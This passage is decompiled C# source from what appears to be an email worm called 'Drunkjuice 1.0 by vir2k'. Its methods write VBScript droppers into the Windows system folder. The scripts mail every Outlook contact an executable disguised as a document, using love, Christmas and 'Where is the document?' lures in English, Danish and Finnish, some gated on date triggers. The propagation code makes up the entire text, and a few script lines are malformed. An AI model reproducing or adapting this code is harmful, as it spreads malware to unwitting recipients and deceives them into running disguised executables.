					IL_00a7:
					if (num6 < files.Length)
					{
						fileInfo = files[num6];
						goto IL_006d;
					}
					num5 = checked(num5 + 1);
					goto IL_00b5;
					IL_009d:
					num6 = checked(num6 + 1);
					goto IL_00a3;
					IL_00b5:
					num = 12;
					goto IL_00b9;
					end_IL_0000_2:
					break;
				}
				num = 15;
				Tags();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 290;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void Tags()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 92:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0015;
						case 4:
							goto IL_0022;
						case 5:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 6:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0022:
					num = 4;
					streamWriter.Close();
					break;
					IL_0015:
					num = 3;
					streamWriter.WriteLine("Drunkjuice 1.0 by vir2k");
					goto IL_0022;
					IL_0008:
					num = 2;
					streamWriter = File.CreateText("C:\\windows\\nfofile.nfo");
					goto IL_0015;
					end_IL_0000_2:
					break;
				}
				num = 5;
				Christmas();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 92;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void Christmas()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 488:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0015;
						case 4:
							goto IL_0022;
						case 5:
							goto IL_002f;
						case 6:
							goto IL_003c;
						case 7:
							goto IL_0049;
						case 8:
							goto IL_0056;
						case 9:
							goto IL_0063;
						case 10:
							goto IL_0071;
						case 11:
							goto IL_007f;
						case 12:
							goto IL_008d;
						case 13:
							goto IL_009b;
						case 14:
							goto IL_00a9;
						case 15:
							goto IL_00b7;
						case 16:
							goto IL_00c5;
						case 17:
							goto IL_00d3;
						case 18:
							goto IL_00e1;
						case 19:
							goto IL_00ef;
						case 20:
							goto IL_00fd;
						case 21:
							goto IL_010b;
						case 22:
							goto IL_0119;
						case 23:
							goto IL_0127;
						case 24:
							goto IL_0135;
						case 25:
							goto IL_0143;
						case 26:
							goto IL_0151;
						case 27:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 28:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0151:
					num = 26;
					streamWriter.Close();
					break;
					IL_0143:
					num = 25;
					streamWriter.WriteLine("end if");
					goto IL_0151;
					IL_0008:
					num = 2;
					streamWriter = File.CreateText("C:\\Windows\\System\\christmassend.vbs");
					goto IL_0015;
					IL_0015:
					num = 3;
					streamWriter.WriteLine("If Month(Now) = 12 Then");
					goto IL_0022;
					IL_0022:
					num = 4;
					streamWriter.WriteLine("on error resume next");
					goto IL_002f;
					IL_002f:
					num = 5;
					streamWriter.WriteLine("dim a,b,c,d,e");
					goto IL_003c;
					IL_003c:
					num = 6;
					streamWriter.WriteLine("set a = Wscript.CreateObject(\"Wscript.Shell\")");
					goto IL_0049;
					IL_0049:
					num = 7;
					streamWriter.WriteLine("set b = CreateObject(\"Outlook.Application\")");
					goto IL_0056;
					IL_0056:
					num = 8;
					streamWriter.WriteLine("set c = b.GetNameSpace(\"MAPI\")");
					goto IL_0063;
					IL_0063:
					num = 9;
					streamWriter.WriteLine("for y = 1 To c.AddressLists.Count");
					goto IL_0071;
					IL_0071:
					num = 10;
					streamWriter.WriteLine("set d = c.AddressLists(y)");
					goto IL_007f;
					IL_007f:
					num = 11;
					streamWriter.WriteLine("x = 1");
					goto IL_008d;
					IL_008d:
					num = 12;
					streamWriter.WriteLine("set e = b.CreateItem(0)");
					goto IL_009b;
					IL_009b:
					num = 13;
					streamWriter.WriteLine("for o = 1 To d.AddressEntries.Count");
					goto IL_00a9;
					IL_00a9:
					num = 14;
					streamWriter.WriteLine("f = d.AddressEntries(x)");
					goto IL_00b7;
					IL_00b7:
					num = 15;
					streamWriter.WriteLine("e.Recipients.Add f");
					goto IL_00c5;
					IL_00c5:
					num = 16;
					streamWriter.WriteLine("x = x + 1");
					goto IL_00d3;
					IL_00d3:
					num = 17;
					streamWriter.WriteLine("next");
					goto IL_00e1;
					IL_00e1:
					num = 18;
					streamWriter.WriteLine("e.Subject = \"Merry Christmas!\"");
					goto IL_00ef;
					IL_00ef:
					num = 19;
					streamWriter.WriteLine("e.Body = \"Merry Christmas my love\"");
					goto IL_00fd;
					IL_00fd:
					num = 20;
					streamWriter.WriteLine("e.Attachments.Add (\"C:\\Windows\\christmas-love.doc.exe\")");
					goto IL_010b;
					IL_010b:
					num = 21;
					streamWriter.WriteLine("e.DeleteAfterSubmit = False");
					goto IL_0119;
					IL_0119:
					num = 22;
					streamWriter.WriteLine("e.Send");
					goto IL_0127;
					IL_0127:
					num = 23;
					streamWriter.WriteLine("f = \"");
					goto IL_0135;
					IL_0135:
					num = 24;
					streamWriter.WriteLine("echo next");
					goto IL_0143;
					end_IL_0000_2:
					break;
				}
				num = 27;
				Love();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 488;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void Love()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 488:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0015;
						case 4:
							goto IL_0022;
						case 5:
							goto IL_002f;
						case 6:
							goto IL_003c;
						case 7:
							goto IL_0049;
						case 8:
							goto IL_0056;
						case 9:
							goto IL_0063;
						case 10:
							goto IL_0071;
						case 11:
							goto IL_007f;
						case 12:
							goto IL_008d;
						case 13:
							goto IL_009b;
						case 14:
							goto IL_00a9;
						case 15:
							goto IL_00b7;
						case 16:
							goto IL_00c5;
						case 17:
							goto IL_00d3;
						case 18:
							goto IL_00e1;
						case 19:
							goto IL_00ef;
						case 20:
							goto IL_00fd;
						case 21:
							goto IL_010b;
						case 22:
							goto IL_0119;
						case 23:
							goto IL_0127;
						case 24:
							goto IL_0135;
						case 25:
							goto IL_0143;
						case 26:
							goto IL_0151;
						case 27:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 28:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0151:
					num = 26;
					streamWriter.Close();
					break;
					IL_0143:
					num = 25;
					streamWriter.WriteLine("end if");
					goto IL_0151;
					IL_0008:
					num = 2;
					streamWriter = File.CreateText("C:\\Windows\\System\\loveletter.vbs");
					goto IL_0015;
					IL_0015:
					num = 3;
					streamWriter.WriteLine("If Day(Now) = 3 Month(Now) = 4 Then");
					goto IL_0022;
					IL_0022:
					num = 4;
					streamWriter.WriteLine("on error resume next");
					goto IL_002f;
					IL_002f:
					num = 5;
					streamWriter.WriteLine("dim a,b,c,d,e");
					goto IL_003c;
					IL_003c:
					num = 6;
					streamWriter.WriteLine("set a = Wscript.CreateObject(\"Wscript.Shell\")");
					goto IL_0049;
					IL_0049:
					num = 7;
					streamWriter.WriteLine("set b = CreateObject(\"Outlook.Application\")");
					goto IL_0056;
					IL_0056:
					num = 8;
					streamWriter.WriteLine("set c = b.GetNameSpace(\"MAPI\")");
					goto IL_0063;
					IL_0063:
					num = 9;
					streamWriter.WriteLine("for y = 1 To c.AddressLists.Count");
					goto IL_0071;
					IL_0071:
					num = 10;
					streamWriter.WriteLine("set d = c.AddressLists(y)");
					goto IL_007f;
					IL_007f:
					num = 11;
					streamWriter.WriteLine("x = 1");
					goto IL_008d;
					IL_008d:
					num = 12;
					streamWriter.WriteLine("set e = b.CreateItem(0)");
					goto IL_009b;
					IL_009b:
					num = 13;
					streamWriter.WriteLine("for o = 1 To d.AddressEntries.Count");
					goto IL_00a9;
					IL_00a9:
					num = 14;
					streamWriter.WriteLine("f = d.AddressEntries(x)");
					goto IL_00b7;
					IL_00b7:
					num = 15;
					streamWriter.WriteLine("e.Recipients.Add f");
					goto IL_00c5;
					IL_00c5:
					num = 16;
					streamWriter.WriteLine("x = x + 1");
					goto IL_00d3;
					IL_00d3:
					num = 17;
					streamWriter.WriteLine("next");
					goto IL_00e1;
					IL_00e1:
					num = 18;
					streamWriter.WriteLine("e.Subject = \"ILOVEYOU\"");
					goto IL_00ef;
					IL_00ef:
					num = 19;
					streamWriter.WriteLine("e.Body = \"kindly check the attached LOVELETTER coming from me.\"");
					goto IL_00fd;
					IL_00fd:
					num = 20;
					streamWriter.WriteLine("e.Attachments.Add (\"C:\\Windows\\LOVE-LETTER-FOR-YOU.TXT.exe\")");
					goto IL_010b;
					IL_010b:
					num = 21;
					streamWriter.WriteLine("e.DeleteAfterSubmit = False");
					goto IL_0119;
					IL_0119:
					num = 22;
					streamWriter.WriteLine("e.Send");
					goto IL_0127;
					IL_0127:
					num = 23;
					streamWriter.WriteLine("f = \"");
					goto IL_0135;
					IL_0135:
					num = 24;
					streamWriter.WriteLine("echo next");
					goto IL_0143;
					end_IL_0000_2:
					break;
				}
				num = 27;
				SendMailEng();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 488;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void SendMailEng()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 452:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0015;
						case 4:
							goto IL_0022;
						case 5:
							goto IL_002f;
						case 6:
							goto IL_003c;
						case 7:
							goto IL_0049;
						case 8:
							goto IL_0056;
						case 9:
							goto IL_0063;
						case 10:
							goto IL_0071;
						case 11:
							goto IL_007f;
						case 12:
							goto IL_008d;
						case 13:
							goto IL_009b;
						case 14:
							goto IL_00a9;
						case 15:
							goto IL_00b7;
						case 16:
							goto IL_00c5;
						case 17:
							goto IL_00d3;
						case 18:
							goto IL_00e1;
						case 19:
							goto IL_00ef;
						case 20:
							goto IL_00fd;
						case 21:
							goto IL_010b;
						case 22:
							goto IL_0119;
						case 23:
							goto IL_0127;
						case 24:
							goto IL_0135;
						case 25:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 26:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0135:
					num = 24;
					streamWriter.Close();
					break;
					IL_0127:
					num = 23;
					streamWriter.WriteLine("echo next");
					goto IL_0135;
					IL_0008:
					num = 2;
					streamWriter = File.CreateText("C:\\Windows\\System\\sendmaileng.vbs");
					goto IL_0015;
					IL_0015:
					num = 3;
					streamWriter.WriteLine("on error resume next");
					goto IL_0022;
					IL_0022:
					num = 4;
					streamWriter.WriteLine("dim a,b,c,d,e");
					goto IL_002f;
					IL_002f:
					num = 5;
					streamWriter.WriteLine("set a = Wscript.CreateObject(\"Wscript.Shell\")");
					goto IL_003c;
					IL_003c:
					num = 6;
					streamWriter.WriteLine("set b = CreateObject(\"Outlook.Application\")");
					goto IL_0049;
					IL_0049:
					num = 7;
					streamWriter.WriteLine("set c = b.GetNameSpace(\"MAPI\")");
					goto IL_0056;
					IL_0056:
					num = 8;
					streamWriter.WriteLine("for y = 1 To c.AddressLists.Count");
					goto IL_0063;
					IL_0063:
					num = 9;
					streamWriter.WriteLine("set d = c.AddressLists(y)");
					goto IL_0071;
					IL_0071:
					num = 10;
					streamWriter.WriteLine("x = 1");
					goto IL_007f;
					IL_007f:
					num = 11;
					streamWriter.WriteLine("set e = b.CreateItem(0)");
					goto IL_008d;
					IL_008d:
					num = 12;
					streamWriter.WriteLine("for o = 1 To d.AddressEntries.Count");
					goto IL_009b;
					IL_009b:
					num = 13;
					streamWriter.WriteLine("f = d.AddressEntries(x)");
					goto IL_00a9;
					IL_00a9:
					num = 14;
					streamWriter.WriteLine("e.Recipients.Add f");
					goto IL_00b7;
					IL_00b7:
					num = 15;
					streamWriter.WriteLine("x = x + 1");
					goto IL_00c5;
					IL_00c5:
					num = 16;
					streamWriter.WriteLine("next");
					goto IL_00d3;
					IL_00d3:
					num = 17;
					streamWriter.WriteLine("e.Subject = \"RE: RE: Where is the document?\"");
					goto IL_00e1;
					IL_00e1:
					num = 18;
					streamWriter.WriteLine("e.Body = \"Here is the document!\"");
					goto IL_00ef;
					IL_00ef:
					num = 19;
					streamWriter.WriteLine("e.Attachments.Add (\"C:\\Windows\\bankdoc.doc.exe\")");
					goto IL_00fd;
					IL_00fd:
					num = 20;
					streamWriter.WriteLine("e.DeleteAfterSubmit = False");
					goto IL_010b;
					IL_010b:
					num = 21;
					streamWriter.WriteLine("e.Send");
					goto IL_0119;
					IL_0119:
					num = 22;
					streamWriter.WriteLine("f = \"");
					goto IL_0127;
					end_IL_0000_2:
					break;
				}
				num = 25;
				SendMailDk();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 452;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void SendMailDk()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 452:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0015;
						case 4:
							goto IL_0022;
						case 5:
							goto IL_002f;
						case 6:
							goto IL_003c;
						case 7:
							goto IL_0049;
						case 8:
							goto IL_0056;
						case 9:
							goto IL_0063;
						case 10:
							goto IL_0071;
						case 11:
							goto IL_007f;
						case 12:
							goto IL_008d;
						case 13:
							goto IL_009b;
						case 14:
							goto IL_00a9;
						case 15:
							goto IL_00b7;
						case 16:
							goto IL_00c5;
						case 17:
							goto IL_00d3;
						case 18:
							goto IL_00e1;
						case 19:
							goto IL_00ef;
						case 20:
							goto IL_00fd;
						case 21:
							goto IL_010b;
						case 22:
							goto IL_0119;
						case 23:
							goto IL_0127;
						case 24:
							goto IL_0135;
						case 25:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 26:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0135:
					num = 24;
					streamWriter.Close();
					break;
					IL_0127:
					num = 23;
					streamWriter.WriteLine("echo next");
					goto IL_0135;
					IL_0008:
					num = 2;
					streamWriter = File.CreateText("C:\\Windows\\System\\sendmaildk.vbs");
					goto IL_0015;
					IL_0015:
					num = 3;
					streamWriter.WriteLine("on error resume next");
					goto IL_0022;
					IL_0022:
					num = 4;
					streamWriter.WriteLine("dim a,b,c,d,e");
					goto IL_002f;
					IL_002f:
					num = 5;
					streamWriter.WriteLine("set a = Wscript.CreateObject(\"Wscript.Shell\")");
					goto IL_003c;
					IL_003c:
					num = 6;
					streamWriter.WriteLine("set b = CreateObject(\"Outlook.Application\")");
					goto IL_0049;
					IL_0049:
					num = 7;
					streamWriter.WriteLine("set c = b.GetNameSpace(\"MAPI\")");
					goto IL_0056;
					IL_0056:
					num = 8;
					streamWriter.WriteLine("for y = 1 To c.AddressLists.Count");
					goto IL_0063;
					IL_0063:
					num = 9;
					streamWriter.WriteLine("set d = c.AddressLists(y)");
					goto IL_0071;
					IL_0071:
					num = 10;
					streamWriter.WriteLine("x = 1");
					goto IL_007f;
					IL_007f:
					num = 11;
					streamWriter.WriteLine("set e = b.CreateItem(0)");
					goto IL_008d;
					IL_008d:
					num = 12;
					streamWriter.WriteLine("for o = 1 To d.AddressEntries.Count");
					goto IL_009b;
					IL_009b:
					num = 13;
					streamWriter.WriteLine("f = d.AddressEntries(x)");
					goto IL_00a9;
					IL_00a9:
					num = 14;
					streamWriter.WriteLine("e.Recipients.Add f");
					goto IL_00b7;
					IL_00b7:
					num = 15;
					streamWriter.WriteLine("x = x + 1");
					goto IL_00c5;
					IL_00c5:
					num = 16;
					streamWriter.WriteLine("next");
					goto IL_00d3;
					IL_00d3:
					num = 17;
					streamWriter.WriteLine("e.Subject = \"RE: RE: Hvor er det dokument?\"");
					goto IL_00e1;
					IL_00e1:
					num = 18;
					streamWriter.WriteLine("e.Body = \"Her er dokumentet!\"");
					goto IL_00ef;
					IL_00ef:
					num = 19;
					streamWriter.WriteLine("e.Attachments.Add (\"C:\\Windows\\bankdoc.doc.exe\")");
					goto IL_00fd;
					IL_00fd:
					num = 20;
					streamWriter.WriteLine("e.DeleteAfterSubmit = False");
					goto IL_010b;
					IL_010b:
					num = 21;
					streamWriter.WriteLine("e.Send");
					goto IL_0119;
					IL_0119:
					num = 22;
					streamWriter.WriteLine("f = \"");
					goto IL_0127;
					end_IL_0000_2:
					break;
				}
				num = 25;
				SendMailFin();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 452;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void SendMailFin()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 439:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0015;
						case 4:
							goto IL_0022;
						case 5:
							goto IL_002f;
						case 6:
							goto IL_003c;
						case 7:
							goto IL_0049;
						case 8:
							goto IL_0056;
						case 9:
							goto IL_0063;
						case 10:
							goto IL_0071;
						case 11:
							goto IL_007f;
						case 12:
							goto IL_008d;
						case 13:
							goto IL_009b;
						case 14:
							goto IL_00a9;
						case 15:
							goto IL_00b7;
						case 16:
							goto IL_00c5;
						case 17:
							goto IL_00d3;
						case 18:
							goto IL_00e1;
						case 19:
							goto IL_00ef;
						case 20:
							goto IL_00fd;
						case 21:
							goto IL_010b;
						case 22:
							goto IL_0119;
						case 23:
							goto IL_0127;
						case 24:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 25:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0127:
					num = 23;
					streamWriter.WriteLine("echo next");
					break;
					IL_0119:
					num = 22;
					streamWriter.WriteLine("f = \"");
					goto IL_0127;
					IL_0008:
					num = 2;
					streamWriter = File.CreateText("C:\\Windows\\System\\sendmailfin.vbs");
					goto IL_0015;
					IL_0015:
					num = 3;
					streamWriter.WriteLine("on error resume next");
					goto IL_0022;
					IL_0022:
					num = 4;
					streamWriter.WriteLine("dim a,b,c,d,e");
					goto IL_002f;
					IL_002f:
					num = 5;
					streamWriter.WriteLine("set a = Wscript.CreateObject(\"Wscript.Shell\")");
					goto IL_003c;
					IL_003c:
					num = 6;
					streamWriter.WriteLine("set b = CreateObject(\"Outlook.Application\")");
					goto IL_0049;
					IL_0049:
					num = 7;
					streamWriter.WriteLine("set c = b.GetNameSpace(\"MAPI\")");
					goto IL_0056;
					IL_0056:
					num = 8;
					streamWriter.WriteLine("for y = 1 To c.AddressLists.Count");
					goto IL_0063;
					IL_0063:
					num = 9;
					streamWriter.WriteLine("set d = c.AddressLists(y)");
					goto IL_0071;
					IL_0071:
					num = 10;
					streamWriter.WriteLine("x = 1");
					goto IL_007f;
					IL_007f:
					num = 11;
					streamWriter.WriteLine("set e = b.CreateItem(0)");
					goto IL_008d;
					IL_008d:
					num = 12;
					streamWriter.WriteLine("for o = 1 To d.AddressEntries.Count");
					goto IL_009b;
					IL_009b:
					num = 13;
					streamWriter.WriteLine("f = d.AddressEntries(x)");
					goto IL_00a9;
					IL_00a9:
					num = 14;
					streamWriter.WriteLine("e.Recipients.Add f");
					goto IL_00b7;
					IL_00b7:
					num = 15;
					streamWriter.WriteLine("x = x + 1");
					goto IL_00c5;
					IL_00c5:
					num = 16;
					streamWriter.WriteLine("next");
					goto IL_00d3;
					IL_00d3:
					num = 17;
					streamWriter.WriteLine("e.Subject = \"RE: RE:  Missä on dokumentti?\"");
					goto IL_00e1;
					IL_00e1:
					num = 18;
					streamWriter.WriteLine("e.Body = \"Tässä on se dokumentti!\"");
					goto IL_00ef;
					IL_00ef:
					num = 19;
					streamWriter.WriteLine("e.Attachments.Add (\"C:\\Windows\\bankdoc.doc.exe\")");
					goto IL_00fd;
					IL_00fd:
					num = 20;
					streamWriter.WriteLine("e.DeleteAfterSubmit = False");
					goto IL_010b;
					IL_010b:
					num = 21;
					streamWriter.WriteLine("e.Send");
					goto IL_0119;
					end_IL_0000_2:
					break;
				}
				num = 24;
				streamWriter.Close();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 439;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
